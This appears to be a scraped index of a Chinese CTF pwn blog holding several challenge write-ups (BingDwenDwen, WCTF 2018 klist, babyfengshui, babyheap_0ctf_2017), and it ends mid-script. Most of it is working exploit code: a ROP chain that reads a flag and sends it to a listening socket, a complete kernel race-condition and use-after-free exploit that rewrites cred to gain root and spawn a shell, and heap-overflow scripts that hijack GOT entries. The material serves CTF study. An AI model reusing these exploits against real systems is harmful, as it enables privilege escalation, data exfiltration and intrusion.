p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(read_plt)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(write_plt)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))gdb.attach(r)vuln()r.send(b&#x27;flag\\x00&#x27;)r.interactive()\n\nBingDwenDwen看似是一个简单的栈溢出，但是这道题关闭了三个基本的IO流，所以没法泄漏没法多次什么的，需要用到反弹shell。而且题目又开了沙箱，所以只能使用orw然后将结果写入socket流。\n主要流程：open(flag,0) -&gt; read(fd,flag_addr,0x30) -&gt; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) -&gt; dup2(soc,2) -&gt; connect(soc, (struct sockaddr *)&amp;serv_addr,sizeof(struct sockaddr_in)) -&gt;  write(2,flag,0x30)。官方的wp写的也很清楚。\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401356pop_rsi = 0x0000000000401358pop_rdx = 0x0000000000401354pop_rax = 0x000000000040135asyscall_ret = 0x0000000000401351mov_rdi_rcx = 0x000000000040135fpush_rax_pop_rcx = 0x40135Cbingdwendwen = 0x403700flag_addr = bingdwendwen+0x1b0ip_port = bingdwendwen+0x1c0payload = b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)# open(flag,0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx) + \\    p64(pop_rsi)+p64(flag_addr+0x20)+p64(pop_rdx) + \\    p64(0x30)+p64(pop_rax)+p64(0)+p64(syscall_ret)# read(fb,flag,0x30)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(1)+p64(pop_rdx) + \\    p64(0)+p64(pop_rax)+p64(41)+p64(syscall_ret)# socket(2, 1, 0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx)+p64(pop_rsi) + \\    p64(2)+p64(pop_rax)+p64(33)+p64(syscall_ret)# dup2(soc, 2)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(ip_port) + \\    p64(pop_rdx)+p64(16)+p64(pop_rax)+p64(42)+p64(syscall_ret)# connect(2, serv_addr, 16)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(flag_addr+0x20) + \\    p64(pop_rdx)+p64(0x30)+p64(pop_rax)+p64(1)+p64(syscall_ret)# write(2,flag,0x30)payload = payload.ljust(0x1b0, b&#x27;\\x00&#x27;)+b&#x27;./flag&#x27;payload = payload.ljust(0x1c0, b&#x27;\\x00&#x27;)+p64(0x0100007fe8030002)# gdb.attach(r)r.send(payload)r.interactive()\n\n这里的0x0100007fe8030002分开来看是0x0100007f =&gt; 127.0.0.1，0xe803 =&gt; 1000，0x0002 =&gt; AF_INET\n然后在服务器运行\nimport socketserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.bind((&#x27;localhost&#x27;, 1000))server.listen(1)while True:    conn, addr = server.accept()    try:        print(conn.recv(1024))    except Exception as e:        conn.close()\n\n今天先复现三个了，肝的太晚了！\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"WCTF 2018 klist","url":"/2022/08/07/WCTF-2018-klist/","content":"题目分析题目实现的功能很容易看出来\n__int64 __fastcall list_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;    if ( a2 == 0x1338 )        return select_item(a1, a3);    if ( a2 &lt;= 0x1338 )    &#123;        if ( a2 == 0x1337 )            return add_item(a3);    &#125;    else    &#123;        if ( a2 == 0x1339 )            return remove_item(a3);        if ( a2 == 0x133A )            return list_head(a3);    &#125;    return -22LL;&#125;\n\n主要实现了对堆块的申请，释放，读写\n__int64 __fastcall add_item(__int64 a1)&#123;    __int64 v1; // rax    __int64 size; // rdx    __int64 v3; // rsi    __int64 chunk; // rbx    __int64 v5; // rax    __int64 v7[3]; // [rsp+0h] [rbp-18h] BYREF    if ( copy_from_user(v7, a1, 0x10LL) || v7[0] &gt; 0x400uLL )        return -22LL;    v1 = _kmalloc(v7[0] + 0x18, 0x14202C0LL);    size = v7[0];    v3 = v7[1];    *v1 = 1;    chunk = v1;    *(v1 + 8) = size;    if ( copy_from_user(v1 + 0x18, v3, size) )    &#123;        kfree(chunk);        return -22LL;    &#125;    else    &#123;        mutex_lock(&amp;list_lock);        v5 = g_list;        g_list = chunk;        *(chunk + 0x10) = v5;        mutex_unlock(&amp;list_lock);        return 0LL;    &#125;&#125;\n\n在这里可以分析出申请堆块的参数：\nstruct create_chunk_arg&#123;    unsigned long int size;    char *buf;&#125;;\n\n以及堆块的结构：\nstruct chunk&#123;    inuse;    size;    prev;    buf;&#125;\n\n__int64 __fastcall remove_item(__int64 a1)&#123;    __int64 v1; // rax    __int64 v2; // rdx    __int64 v3; // rdi    __int64 v5; // rdi    if ( a1 &gt;= 0 )    &#123;        mutex_lock(&amp;list_lock);        if ( !a1 )        &#123;            v5 = g_list;            if ( g_list )            &#123;                g_list = *(g_list + 16);                put(v5);                mutex_unlock(&amp;list_lock);                return 0LL;            &#125;            goto LABEL_12;        &#125;        v1 = g_list;        if ( a1 != 1 )        &#123;            if ( !g_list )            &#123;                LABEL_12:                mutex_unlock(&amp;list_lock);                return -22LL;            &#125;            v2 = 1LL;            while ( 1 )            &#123;                ++v2;                v1 = *(v1 + 16);                if ( a1 == v2 )                    break;                if ( !v1 )                    goto LABEL_12;            &#125;        &#125;        v3 = *(v1 + 0x10);        if ( v3 )        &#123;            *(v1 + 0x10) = *(v3 + 0x10);            put(v3);            mutex_unlock(&amp;list_lock);            return 0LL;        &#125;        goto LABEL_12;    &#125;    return -22LL;&#125;\n\n在删除函数可以看出来这里并没有直接kfree来进行删除，而是调用了put函数：\n__int64 __fastcall put(volatile signed __int32 *a1)&#123;  __int64 result; // rax  if ( a1 )  &#123;    if ( !_InterlockedDecrement(a1) )      return kfree(a1);  &#125;  return result;&#125;\n\n而这个put函数就是对chunk的inuse位进行减一的操作，如果为0则进行kfree，结合上面的remove函数其中的脱链操作也是没有问题的，不存在UAF\n__int64 __fastcall select_item(__int64 a1, __int64 a2)&#123;    __int64 v2; // rbx    __int64 v3; // rax    __int64 *v4; // rbp    mutex_lock(&amp;list_lock);    v2 = g_list;    if ( a2 &gt; 0 )    &#123;        if ( !g_list )        &#123;            LABEL_8:            mutex_unlock(&amp;list_lock);            return -22LL;        &#125;        v3 = 0LL;        while ( 1 )        &#123;            ++v3;            v2 = *(v2 + 0x10);            if ( a2 == v3 )                break;            if ( !v2 )                goto LABEL_8;        &#125;    &#125;    if ( !v2 )        return -22LL;    get(v2);    mutex_unlock(&amp;list_lock);    v4 = *(a1 + 0xC8);    mutex_lock(v4 + 1);    put(*v4);    *v4 = v2;    mutex_unlock(v4 + 1);    return 0LL;&#125;\n\n再看select函数，这一函数实现的功能是选取一个chunk放到(fd+0xc8)位置。\nunsigned __int64 __fastcall list_head(__int64 a1)&#123;    __int64 v1; // rbx    unsigned __int64 v2; // rbx    mutex_lock(&amp;list_lock);    get(g_list);    v1 = g_list;    mutex_unlock(&amp;list_lock);    v2 = -(copy_to_user(a1, v1, *(v1 + 8) + 0x18LL) != 0) &amp; 0xFFFFFFFFFFFFFFEALL;    put(g_list);    return v2;&#125;\n\nlist_head函数则是取出chunk内容，这里的size是在create时放在堆块中的size。\n漏洞分析题目中题看上去是没有任何问题的，但是在启动脚本中我们可以看到：\n#!/bin/shqemu-system-x86_64 \\    -enable-kvm \\    -cpu kvm64,+smep \\    -kernel ./bzImage \\    -append &quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot; \\    -initrd ./rootfs.cpio \\    -nographic \\    -m 512M \\    -smp cores=2,threads=2,sockets=1 \\    -monitor /dev/null \\    -nographic \\    -s\n\n启动了两个核心，虽然程序使用了互斥锁但任存在条件竞争漏洞\n在create的入链操作中：\nmutex_lock(&amp;list_lock);v5 = g_list;g_list = chunk;*(chunk + 0x10) = v5;mutex_unlock(&amp;list_lock);\n\n可以看到这里是首先上锁，然后进行操作\nmutex_lock(&amp;list_lock);get(g_list);v1 = g_list;mutex_unlock(&amp;list_lock);v2 = -(copy_to_user(a1, v1, *(v1 + 8) + 0x18LL) != 0) &amp; 0xFFFFFFFFFFFFFFEALL;put(g_list);\n\n然而在list_head函数中是在获取了链中的第一个chunk就会释放锁，并且最后会进行put函数，如果我们能够在释放锁之后，put函数之前让create新建的chunk入链则会让新入链的chunk进入put函数，然而新chunk的inuse位为1，所以就会直接free掉，那么此时就存在了UAF的chunk了。\n漏洞利用这里就接着看read和write函数\n__int64 __fastcall list_read(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;    __int64 *v5; // r13    __int64 v6; // rsi    _QWORD *v7; // rdi    v5 = *(a1 + 0xC8);    mutex_lock(v5 + 1);    v6 = *v5;    if ( *v5 )    &#123;        if ( *(v6 + 8) &lt;= a3 )            a3 = *(v6 + 8);        v7 = v5 + 1;        if ( copy_to_user(a2, v6 + 0x18, a3) )        &#123;            mutex_unlock(v7);            return -22LL;        &#125;        else        &#123;            mutex_unlock(v7);            return a3;        &#125;    &#125;    else    &#123;        mutex_unlock(v5 + 1);        return -22LL;    &#125;&#125;\n\n这里可以看到read函数操作的chunk就是我们在select函数中放到(fd+0xc8)位置的chunk，并且只要我们传入的第三个参数不大于chunk中记录size的位置就可以进行读取\n__int64 __fastcall list_write(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;    __int64 *v4; // rbp    __int64 v5; // rdi    __int64 v6; // rax    _QWORD *v7; // rdi    v4 = *(a1 + 0xC8);    mutex_lock(v4 + 1);    v5 = *v4;    if ( *v4 )    &#123;        if ( *(v5 + 8) &lt;= a3 )            a3 = *(v5 + 8);        v6 = copy_from_user(v5 + 0x18, a2, a3);        v7 = v4 + 1;        if ( v6 )        &#123;            mutex_unlock(v7);            return -22LL;        &#125;        else        &#123;            mutex_unlock(v7);            return a3;        &#125;    &#125;    else    &#123;        mutex_unlock(v4 + 1);        return -22LL;    &#125;&#125;\n\nwrite函数类似于上面的read函数。\n那么我们的思路就是覆盖上面chunk存放size的位置即可了，这样我们就可以实现任意地址写了。那么我们就需要用到堆喷的技术，内核的堆喷我的理解就是申请大量的chunk，那么大概率会一个chunk落在期望的位置上，而这道题目我们期望的位置也就是存在UAF的堆块的位置。这道题因为在init中的限制，这里选择的msgsnd进行堆喷，下面是进行堆喷的使用模板：\n#define BUFF_SIZE 96-48struct &#123;    long mtype;    char mtext[BUFF_SIZE];&#125; msg;memset(msg.mtext, 0x42, BUFF_SIZE-1);msg.mtext[BUFF_SIZE] = 0;msg.mtype = 1;int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);\n\n在一次msgsnd的过程中会申请一个size为96的chunk，其中前面的48字节为不可控的内容\nstruct msg_msg &#123;\tstruct list_head m_list;\tlong m_type;\tsize_t m_ts;\t\t/* message text size */\tstruct msg_msgseg *next;\tvoid *security;\t/* the actual message follows immediately */&#125;;\n\n好在msg_msg结构体的前16个字节为两个指针，并且后八位正好落在chunk的size位上，那么如果有一个msg_msg结构体落在了我们的UAF的chunk上我们就可以进行任意地址读写了。接着的思路就是提权，在前两篇的kernel文章中提到了三种提权方式，相比较下使用修改cred结构体的提权方式更为简单，不熟悉的朋友可以去看一下 kernel pwn 任意地址读写提升权限[1]  不过这道题目即便是泄露了地址也无法计算当前chunk的地址与cred结构体的地址的偏移所以没法直接使用以前的方法 这里更好的办法是直接根据uid去寻找cred结构体，因为在上面那片文章cred结构体是通过kmem_cache_alloc创建的。\n综上，exp#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#define BUFF_SIZE 96 - 48/*struct chunk&#123;    inuse    size    prev    buf&#125;*/struct create_chunk_arg&#123;    unsigned long int size;    char *buf;&#125;;struct msg&#123;    long mtype;    char mtext[BUFF_SIZE];&#125;;void set_cred_root(char *cred, int len, int id)&#123;    int i;    for (i = 0; i &lt; len; i += 4)    &#123;        if (*(int *)(cred + i) == id)            *(int *)(cred + i) = 0;    &#125;&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int myMemmem(char *a, int alen, char *b, int blen)&#123;    int i, j;    for (i = 0; i &lt;= alen - blen; ++i)    &#123;        for (j = 0; j &lt; blen; ++j)        &#123;            if (a[i + j] != b[j])            &#123;                break;            &#125;        &#125;        if (j &gt;= blen)        &#123;            return i;        &#125;    &#125;    return -1;&#125;int main()&#123;    struct create_chunk_arg create_arg;    char *buf = malloc(0x200);    int fd;    char *res = malloc(0x1000);    fd = open(&quot;/dev/klist&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-]open file error\\n&quot;);        exit(-1);    &#125;    memset(buf, &#x27;a&#x27;, 0x200);    create_arg.size = 96 - 0x18;    create_arg.buf = buf;    ioctl(fd, 0x1337, &amp;create_arg);    if (fork() == 0)    &#123;        for (int i = 0; i &lt; 0x1000; i++)        &#123;            ioctl(fd, 0x1337, &amp;create_arg);            ioctl(fd, 0x133A, res);            if (*(int *)res == 1)            &#123;                printf(&quot;[*]get the UAF chunk!\\n&quot;);                exit(0);            &#125;        &#125;        printf(&quot;[-]gg\\n&quot;);        exit(0);    &#125;    for (int i = 0; i &lt; 0x1500; i++)    &#123;        ioctl(fd, 0x133A, res);    &#125;    if (fork() == 0)    &#123;        for (int i = 0; i &lt; 0x100; i++)        &#123;            struct msg msg;            int i;            memset(msg.mtext, 0x42, BUFF_SIZE - 1);            msg.mtext[BUFF_SIZE] = 0;            msg.mtype = 1;            for (i = 0; i &lt; BUFF_SIZE; i++)                msg.mtext[i] = &#x27;\\xff&#x27;;            int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);            msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);        &#125;        exit(0);    &#125;    sleep(3);    memset(res, 0, 0x1000);    ioctl(fd, 0x1338, 0);    read(fd, res, 0x1000);    if (*(unsigned long int *)res == 0x6161616161616161)    &#123;        puts(&quot;[-] cannot realloc the chunk &quot;);        exit(-1);    &#125;    puts(&quot;[+] now we can read everywhere&quot;);    char *mem = malloc(0x300000);    read(fd, mem, 0x300000);    char cred[0x20];    *(size_t *)cred = 0x000003e800000003;    *(size_t *)(cred + 8) = 0x000003e8000003e8;    *(size_t *)(cred + 0x10) = 0x000003e8000003e8;    *(size_t *)(cred + 0x18) = 0x000003e8000003e8;    int found = myMemmem(mem, 0x300000, cred, 0x20);    if (found == -1)    &#123;        puts(&quot;[-]cannot find cred struct !&quot;);        exit(-1);    &#125;    char *final = found + mem;    print_hex(final - 0x8, 0xb0);    set_cred_root(final - 0x8, 0x40, 1000);    print_hex(final - 0x8, 0xb0);    write(fd, mem, found + 0xb0);    if (getuid() == 0)    &#123;        printf(&quot;[+]now you are r00t,enjoy ur shell\\n&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[-] there must be something error ... &quot;);        exit(-1);    &#125;    return 0;&#125;\n\n这里就是成功的结果图：\n\n题目我会放在：https://github.com/196082/196082\n\n参考链接：\nhttp://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8\nhttps://xz.aliyun.com/t/2814\n","categories":["kernel-pwn"],"tags":["heap spray","Double Fetch"]},{"title":"babyfengshui","url":"/2021/11/24/babyfengshui/","content":"检查程序\n打开了canary和nx但是是partial relro。\n流程分析void __cdecl __noreturn main()&#123;  char v0; // [esp+3h] [ebp-15h] BYREF  int v1; // [esp+4h] [ebp-14h] BYREF  int v2[4]; // [esp+8h] [ebp-10h] BYREF  v2[1] = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  alarm(0x14u);  while ( 1 )  &#123;    puts(&quot;0: Add a user&quot;);    puts(&quot;1: Delete a user&quot;);    puts(&quot;2: Display a user&quot;);    puts(&quot;3: Update a user description&quot;);    puts(&quot;4: Exit&quot;);    printf(&quot;Action: &quot;);    if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 )      break;    if ( !v1 )    &#123;      printf(&quot;size of description: &quot;);      __isoc99_scanf(&quot;%u%c&quot;, v2, &amp;v0);      add_user(v2[0]);    &#125;    if ( v1 == 1 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      delete_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 2 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      display_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 3 )    &#123;      printf(&quot;index: &quot;);      __isoc99_scanf(&quot;%d&quot;, v2);      update_user(LOBYTE(v2[0]));    &#125;    if ( v1 == 4 )    &#123;      puts(&quot;Bye&quot;);      exit(0);    &#125;    if ( (unsigned __int8)byte_804B069 &gt; 0x31u )    &#123;      puts(&quot;maximum capacity exceeded, bye&quot;);      exit(0);    &#125;  &#125;  exit(1);&#125;\n\n可以看出来又是一道菜单题\nadd一个用户的时候\n_DWORD *__cdecl add_user(size_t a1)&#123;  void *s; // [esp+14h] [ebp-14h]  _DWORD *v3; // [esp+18h] [ebp-10h]  s = malloc(a1);  memset(s, 0, a1);  v3 = malloc(0x80u);  memset(v3, 0, 0x80u);  *v3 = s;  *(&amp;ptr + (unsigned __int8)byte_804B069) = v3;  printf(&quot;name: &quot;);  sub_80486BB((char *)*(&amp;ptr + (unsigned __int8)byte_804B069) + 4, 124);  update_user((unsigned __int8)byte_804B069++);  return v3;&#125;\n\nuser的结构体可以看成\nstruct user&#123;    int *description;// 存放description这个chunk的指针    char name[0x7c];&#125;\n\n\n\n这里没有堆溢出，堆溢出主要发生在update_user\nunsigned int __cdecl update_user(unsigned __int8 a1)&#123;  char v2; // [esp+17h] [ebp-11h] BYREF  int v3; // [esp+18h] [ebp-10h] BYREF  unsigned int v4; // [esp+1Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  if ( a1 &lt; (unsigned __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )  &#123;    v3 = 0;    printf(&quot;text length: &quot;);    __isoc99_scanf(&quot;%u%c&quot;, &amp;v3, &amp;v2);    if ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )    &#123;      puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);      exit(1);    &#125;    printf(&quot;text: &quot;);    sub_80486BB(*(_DWORD *)*(&amp;ptr + a1), v3 + 1);  &#125;  return __readgsdword(0x14u) ^ v4;&#125;\n\n虽然写入的长度我们可控但是这里有一个限制条件\nif ( (char *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (char *)*(&amp;ptr + a1) - 4 )\n\n翻译过来就是输入的长度加上description堆块的地址必须小于user堆块的地址\n利用思路虽然两个malloc是相邻的，但是不代表他们的chunk是相邻的，因为我们还可以删除控制bin。\n首先add两个description为0x20的用户(user_chunk已经默认为0x80了)\n然后delete第一个user，此时内存剩下来一个大小为0x20和0x80的chunk\n这个时候再add一个description为0x80的chunk，由于是先malloc description这个chunk所以他会占据我们delete掉的user的user_chunk\n这时候就可以进行堆溢出，堆溢出的思路就是覆盖掉第二个user的user_chunk的第三个字节也就是存放description指针的位置\n然后display第二个user就可以实现读取任意地址，update第二个就可以实现写入任意地址\nexpfrom pwn import *elf = ELF(&#x27;./babyfengshui/babyfengshui&#x27;)libc = ELF(&#x27;./babyfengshui/libc.so.6&#x27;)r = process(&#x27;./babyfengshui/babyfengshui&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 57741)context.log_level = &#x27;debug&#x27;free_got_addr = elf.got[&#x27;free&#x27;]def add_user(description_size, name, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;size of description: &#x27;)    r.sendline(bytes(str(description_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def delete_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def display_user(index):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))def update_user(index, text_length, text):    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index: &#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text length:&#x27;)    r.sendline(bytes(str(text_length), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;text:&#x27;)    r.sendline(text)def exit():    r.recvuntil(b&#x27;Action: &#x27;)    r.sendline(b&#x27;4&#x27;)if __name__ == &#x27;__main__&#x27;:    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;a&#x27;*0x20)    add_user(0x20, b&#x27;196082&#x27;, 0x20, b&#x27;b&#x27;*0x20)    add_user(0x8, b&#x27;196082&#x27;, 0x8, b&#x27;/bin/sh\\x00&#x27;)    # gdb.attach(r)    # pause()    delete_user(0)    payload = b&#x27;c&#x27;*0x80+p32(0x90)+p32(0x31)+b&#x27;d&#x27;*0x20 + \\        p32(0x30)+p32(0x91)+p32(free_got_addr)    add_user(0x80, b&#x27;196082&#x27;, 0x8, &#x27;aaaa&#x27;)    update_user(3, len(payload), payload)    display_user(1)    r.recvuntil(b&#x27;description: &#x27;)    free_real_addr = u32(r.recv(4))# 有毒的地方是这道题的libc好像有点问题，我调了很久完全没问题，但是就是这玩意开始用的libc.symbols[&#x27;free&#x27;]就是打不通，看了大佬的wp发现是自己写的地址    offset = free_real_addr-0x070750    system_addr = offset+0x03a940    print(hex(free_real_addr))    print(hex(system_addr))    update_user(1, 4, p32(system_addr))    delete_user(2)    r.interactive()\n\n","categories":["pwn-xctf"],"tags":["堆溢出","篡改GOT表"]},{"title":"babyheap_0ctf_2017","url":"/2022/01/14/babyheap-0ctf-2017/","content":"突然之间发现自己的博客好像还没发过有关fastbin attack的内容，今天抽时间写了一篇\n检测保护\n保护全开。\n流程分析是一个很常规的菜单题。在create函数内部使用的calloc的生成chunk，区别就是会清理生成chunk的内部值。\nvoid __fastcall sub_D48(__int64 a1)&#123;  int i; // [rsp+10h] [rbp-10h]  int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( !*(_DWORD *)(24LL * i + a1) )    &#123;      printf(&quot;Size: &quot;);      v2 = sub_138C();      if ( v2 &gt; 0 )      &#123;        if ( v2 &gt; 4096 )          v2 = 4096;        v3 = calloc(v2, 1uLL);        if ( !v3 )          exit(-1);        *(_DWORD *)(24LL * i + a1) = 1;        *(_QWORD *)(a1 + 24LL * i + 8) = v2;        *(_QWORD *)(a1 + 24LL * i + 16) = v3;        printf(&quot;Allocate Index %d\\n&quot;, (unsigned int)i);      &#125;      return;    &#125;  &#125;&#125;\n\nedit函数就只是判断了chunk是否存在，你写入的内容大小并没有判断，可以造成堆溢出\n__int64 __fastcall sub_E7F(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      printf(&quot;Size: &quot;);      result = sub_138C();      v3 = result;      if ( (int)result &gt; 0 )      &#123;        printf(&quot;Content: &quot;);        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);      &#125;    &#125;  &#125;  return result;&#125;\n\ndelete函数可以看到不存在UAF。\n__int64 __fastcall sub_F50(__int64 a1)&#123;  __int64 result; // rax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )  &#123;    result = *(unsigned int *)(24LL * (int)result + a1);    if ( (_DWORD)result == 1 )    &#123;      *(_DWORD *)(24LL * v2 + a1) = 0;      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;      free(*(void **)(24LL * v2 + a1 + 16));      result = 24LL * v2 + a1;      *(_QWORD *)(result + 16) = 0LL;    &#125;  &#125;  return result;&#125;\n\n正常的show函数\nint __fastcall sub_1051(__int64 a1)&#123;  int result; // eax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )  &#123;    result = *(_DWORD *)(24LL * result + a1);    if ( result == 1 )    &#123;      puts(&quot;Content: &quot;);      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));      result = puts(byte_14F1);    &#125;  &#125;  return result;&#125;\n\n利用分析因为前几天才做了off by one所以这道题的第一反应就是修改chunk的size，覆盖掉后面的就好做了。\n首先创建六个chunk\ncreate(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5\n\n然后通过chunk1修改chunk2的size，然后free掉chunk2，那么chunk2此时进入的就是unsorted bin了。\n\n然后又create大小为0x50的chunk那么此时就会切割unsorted bin当中的chunk\n\n此时的main_arena+88也就跑到了chunk3的位置，又因为没有delete掉chunk3所以直接可以泄漏main_arena，然后就是常规拿到__malloc_hook\nshow(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526a\n\n下面就开始用fastbin attack了\nfastbin attack其实这个攻击方式跟tcache的很类似，不过tcache在2.27就是裸奔fastbin还要检测一下size位。\n\n这里有个满足条件的。\n然后就是把chunk弄过来，然后覆盖掉__malloc_hook就好了\nexpfrom pwn import *elf = ELF(&#x27;./babyheap_0ctf_2017&#x27;)r = process(&#x27;babyheap_0ctf_2017&#x27;)# r = remote(&#x27;node4.buuoj.cn&#x27;, 28943)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, size, data):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(data)def delete(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5edit(1, 0x60, b&#x27;a&#x27;*0x50+p64(0x60)+p64(0x140+1))edit(4, 0x60, b&#x27;a&#x27;*0x50+p64(0x140)+p64(0x20+1))delete(2)create(0x50)  # 2show(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526acreate(0x60)  # 6create(0x60)  # 7delete(7)delete(3)delete(4)create(0x60)  # 